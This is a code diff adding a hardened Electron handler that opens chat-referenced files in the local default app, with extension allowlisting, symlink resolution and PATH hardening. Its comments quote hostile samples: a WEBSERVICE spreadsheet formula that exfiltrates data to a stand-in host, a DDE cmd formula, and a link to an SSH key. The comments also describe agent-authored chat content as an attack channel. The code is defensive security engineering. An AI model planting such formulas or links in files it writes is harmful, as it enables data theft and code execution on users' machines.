@@ -243,6 +243,99 @@ function createIpcRegistrar({
       return detectWsl();
     });
 
+    // Open a file the chat referenced in the user's own editor, by handing its
+    // path to the OS default handler on the machine in front of them.
+    //
+    // Sibling to `crash-reports:reveal`, and gated the same way: this is not a
+    // read, it is a LAUNCH on the local machine, so it takes the full
+    // three-gate local-dashboard check. A connection window pointed at a REMOTE
+    // gateway shares this preload, and must never be able to open a file on the
+    // host running this shell.
+    //
+    // Trust nothing about the path either: the chat transcript is AGENT-authored
+    // (and can carry externally-influenced content), so a hostile
+    // `[open](/Users/me/.ssh/id_rsa)` must not become "launch this". Hence the
+    // same validation shape the `mochi-pet:open-image` handler already uses:
+    //   - realpathSync BEFORE the extension test, so a `.md` symlink to a key
+    //     file is judged by what it actually resolves to;
+    //   - a text/document extension allowlist — a fixed set, deliberately not
+    //     user-extensible (a configurable list reopens the external-scheme
+    //     surface external-scheme.js documents as rejected);
+    //   - a regular-file requirement;
+    //   - a non-empty `openPath` return means the OS refused; surface it rather
+    //     than failing silently.
+    // The chip that reaches this channel is only actionable after the gateway's
+    // own /api/file-read probe has already confirmed a non-sensitive regular
+    // file (is_sensitive_path), so the credential-path denylist is enforced
+    // upstream; the checks here are defence in depth on the launch primitive.
+    ipcMain.handle("dashboard:open-file", async (event, filePath) => {
+      await assertLocalDashboard(event, "dashboard:open-file");
+      if (typeof filePath !== "string" || filePath === "") {
+        return { ok: false, error: "no path" };
+      }
+      const fs = require("fs");
+      const nodePath = require("path");
+      const { openPathHardened } = require("./open-path");
+      // ONLY extensions whose OS default handler opens the file in a
+      // PLAIN-TEXT viewer/editor and CANNOT execute the file's contents. That
+      // predicate -- not a hand-kept list -- is the security bar: shell.openPath
+      // launches the OS default handler and the path is agent-authored, so any
+      // type whose handler can run embedded content is arbitrary code execution.
+      // Four families are therefore excluded, all reachable only through this
+      // affordance (the built-in viewer, which renders inert, remains for them):
+      //   - interpreter/shell scripts (`.js`/`.mjs`/`.cjs` -> Windows Script Host,
+      //     `.py`/`.rb` -> interpreters, `.sh`/`.ps1` -> a shell);
+      //   - browser ACTIVE DOCUMENTS (`.html`/`.htm`/`.svg`/`.xml`) -- the browser
+      //     opens them at a `file://` origin and EXECUTES embedded JavaScript;
+      //   - RICH DOCUMENTS whose default app has a content-execution surface
+      //     (`.doc`/`.docx`/`.odt` -> Word/LibreOffice VBA/macros incl. AutoOpen,
+      //     `.rtf` -> Word OLE, `.pdf` -> reader JavaScript). Legacy `.doc` is the
+      //     clearest case (VBA/AutoOpen), but the whole family fails the predicate;
+      //     and
+      //   - SPREADSHEETS (`.csv`/`.tsv`/`.xls`/`.xlsx`/`.ods`). These LOOK like
+      //     plain text, and that is the trap: the extension decides the app, and
+      //     the default app for them is Excel / Numbers / LibreOffice Calc, which
+      //     EVALUATES any cell opening with `=`, `+`, `-` or `@` as a formula. An
+      //     agent-authored `=WEBSERVICE("http://host/"&A1)` exfiltrates the sheet
+      //     and `=cmd|'/c ...'!A0` reaches DDE, so the bytes are executed by the
+      //     handler even though nothing about the file is a program. Judge the
+      //     predicate on the app that actually opens the type, not on how the
+      //     bytes read to a human.
+      const OPENABLE_EXTS = new Set([
+        ".md", ".markdown", ".txt", ".text", ".rst", ".org", ".log",
+        ".json", ".jsonc", ".json5", ".yaml", ".yml", ".toml", ".ini", ".cfg", ".conf", ".env",
+        ".css", ".graphql", ".proto",
+      ]);
+      try {
+        // realpath BEFORE the extension test: a `.md` symlink to a key file
+        // must be judged by what it actually resolves to.
+        const real = fs.realpathSync(filePath);
+        if (!OPENABLE_EXTS.has(nodePath.extname(real).toLowerCase())) {
+          return { ok: false, error: "unsupported file type" };
+        }
+        if (!fs.statSync(real).isFile()) {
+          return { ok: false, error: "not a file" };
+        }
+        // Hand the launch to the hardened wrapper, not `shell.openPath`: on
+        // Linux the bare `xdg-open` name resolves against the inherited PATH,
+        // so an agent-writable leading entry would shadow the launcher and turn
+        // an open into arbitrary code execution. `openPathHardened` narrows PATH
+        // across the native launch and is a drop-in (same `Promise<string>`,
+        // empty on success) -- it hardens WHICH launcher runs, while the
+        // realpath/extension/isFile checks above decide WHAT it may open.
+        // Non-empty return value means the OS refused to open it.
+        const err = await openPathHardened(shell, real);
+        if (err) {
+          log(`dashboard:open-file: OS refused ${real}: ${err}`);
+          return { ok: false, error: err };
+        }
+        return { ok: true };
+      } catch (e) {
+        log(`dashboard:open-file refused: ${e && e.message}`);
+        return { ok: false, error: String((e && e.message) || e) };
+      }
+    });
+
     ipcMain.handle("zoom:get", (event) =>
       windows.chrome.getZoom(event.sender));
     ipcMain.handle("zoom:set", (event, factor) =>
